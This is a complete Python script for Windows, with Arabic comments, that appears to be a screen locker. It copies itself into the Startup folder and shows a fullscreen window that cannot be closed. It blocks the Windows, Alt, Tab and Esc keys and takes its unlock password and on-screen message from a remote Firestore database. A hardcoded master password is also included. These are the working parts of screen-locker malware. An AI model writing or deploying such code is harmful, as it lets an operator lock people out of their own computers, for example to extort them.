import sys
import os
import shutil
import tkinter as tk
from tkinter import messagebox
import keyboard
import threading
import time
import urllib.request
import json

MASTER_EMERGENCY_PASSWORD = "20102014"  # كلمة الطوارئ السرية الثابتة والوحيدة
DEFAULT_OFFLINE_PASS = "123"

PROJECT_ID = "look-app-exe"

def add_to_startup():
    try:
        startup_folder = os.path.join(
            os.environ['USERPROFILE'],
            r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        )
        if getattr(sys, 'frozen', False):
            current_exe = sys.executable
            destination_path = os.path.join(startup_folder, "SystemLocker.exe")
            if not os.path.exists(destination_path):
                shutil.copyfile(current_exe, destination_path)
    except Exception as e:
        print("خطأ في إضافة التشغيل التلقائي:", e)

class StrongLocker:
    def __init__(self):
        print("جاري بدء تشغيل النظام...")
        add_to_startup()
        
        self.cloud_password = DEFAULT_OFFLINE_PASS
        self.cloud_title = "🔒 النظام مقفل بأمان تام"
        self.cloud_subtitle = "أدخل كلمة المرور لفتح النظام."

        # جلب البيانات من السحابة أولاً
        self.fetch_firestore_data()

        print("جاري بناء واجهة المستخدم...")
        self.root = tk.Tk()
        self.root.title("System Locked")
        
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_close)
        self.root.configure(bg="#0f172a")
        
        self.create_widgets()
        
        self.block_keys_flag = True
        self.block_thread = threading.Thread(target=self.security_loop, daemon=True)
        self.block_thread.start()
        print("تم تفعيل نظام الحماية بنجاح.")

    def fetch_firestore_data(self):
        def worker():
            try:
                url = f"https://firestore.googleapis.com/v1/projects/{PROJECT_ID}/databases/(default)/documents/settings/locker"
                print(f"جاري الاتصال برابط السحابة: {url}")
                
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=5) as response:
                    res_text = response.read().decode('utf-8')
                    res_data = json.loads(res_text)
                    print("استجابة السحابة تم استلامها بنجاح:", res_data)
                    
                    fields = res_data.get('fields', {})
                    if 'password' in fields and 'stringValue' in fields['password']:
                        self.cloud_password = fields['password']['stringValue']
                        print(f"تم تحديث كلمة المرور من السحابة: {self.cloud_password}")
                    if 'title' in fields and 'stringValue' in fields['title']:
                        self.cloud_title = fields['title']['stringValue']
                    if 'subtitle' in fields and 'stringValue' in fields['subtitle']:
                        self.cloud_subtitle = fields['subtitle']['stringValue']
                    
                    # تحديث النصوص إذا كانت الواجهة قد بنيت
                    if hasattr(self, 'title_label'):
                        self.root.after(0, self.update_ui_texts)
            except Exception as e:
                print("فشل الاتصال بالسحابة أو جلب البيانات، السبب بالتفصيل:", e)
        
        threading.Thread(target=worker, daemon=True).start()

    def update_ui_texts(self):
        self.title_label.config(text=self.cloud_title)
        self.sub_label.config(text=self.cloud_subtitle)

    def create_widgets(self):
        self.title_label = tk.Label(
            self.root, 
            text=self.cloud_title, 
            font=("Arial", 32, "bold"), 
            fg="#ef4444", 
            bg="#0f172a"
        )
        self.title_label.pack(pady=(120, 20))

        self.sub_label = tk.Label(
            self.root, 
            text=self.cloud_subtitle, 
            font=("Arial", 16), 
            fg="#94a3b8", 
            bg="#0f172a"
        )
        self.sub_label.pack(pady=10)

        self.entry_var = tk.StringVar()
        self.entry = tk.Entry(
            self.root, 
            textvariable=self.entry_var, 
            font=("Arial", 24), 
            show="*", 
            justify="center",
            bd=0,
            relief="flat"
        )
        self.entry.pack(ipady=10, ipadx=20, pady=30)
        self.entry.focus_set()

        btn = tk.Button(
            self.root, 
            text="فتح القفل", 
            font=("Arial", 16, "bold"), 
            bg="#22c55e", 
            fg="white", 
            activebackground="#16a34a",
            activeforeground="white",
            bd=0,
            cursor="hand2",
            command=self.check_password
        )
        btn.pack(ipady=10, ipadx=30)

        self.root.bind('<Return>', lambda event: self.check_password())

    def prevent_close(self):
        pass

    def security_loop(self):
        while self.block_keys_flag:
            try:
                keyboard.block_key('windows')
                keyboard.block_key('alt')
                keyboard.block_key('tab')
                keyboard.block_key('esc')
                time.sleep(0.1)
            except Exception as e:
                pass

    def check_password(self):
        entered_pass = self.entry_var.get()
        if entered_pass == self.cloud_password or entered_pass == MASTER_EMERGENCY_PASSWORD:
            self.block_keys_flag = False
            try:
                keyboard.unhook_all()
            except:
                pass
            self.root.destroy()
            sys.exit()
        else:
            messagebox.showerror("خطأ", "كلمة المرور غير صحيحة!")
            self.entry.delete(0, tk.END)

if __name__ == "__main__":
    app = StrongLocker()
    app.root.mainloop()